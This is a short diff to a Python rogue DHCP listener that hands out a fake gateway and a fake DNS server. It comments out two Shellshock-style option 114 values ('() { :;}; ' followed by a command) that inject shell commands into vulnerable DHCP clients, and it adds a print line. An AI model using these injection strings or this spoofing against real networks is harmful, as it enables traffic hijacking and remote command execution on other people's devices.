@@ -177,8 +177,8 @@ class DHCPListener:
                     ('router', self.__fakeGatewayIP),
                     ('message-type', type),
                     ("name_server", self.__fakeDNSServer),
-                    (114, "() { ignored;}; " + self.__command),
-                    (114, "() { :;}; " + self.__command),
+                    #(114, "() { ignored;}; " + self.__command),
+                    #(114, "() { :;}; " + self.__command),
                     'end']
                 ))
 
@@ -209,6 +209,7 @@ class DHCPListener:
             print(f"{bcolors.FAIL}[*]{bcolors.ENDC} Device {bcolors.WARNING}{hostname}{bcolors.ENDC} "
                   f"({bcolors.WARNING}{packet[Ether].src}{bcolors.ENDC}){bcolors.ENDC} requested {bcolors.WARNING}{requestedIP}\n")
             self.__dictIPS[requestedIP] = packet[Ether].src
+            print(f"{bcolors.ENDC}")
 
 
 if __name__ == "__main__":
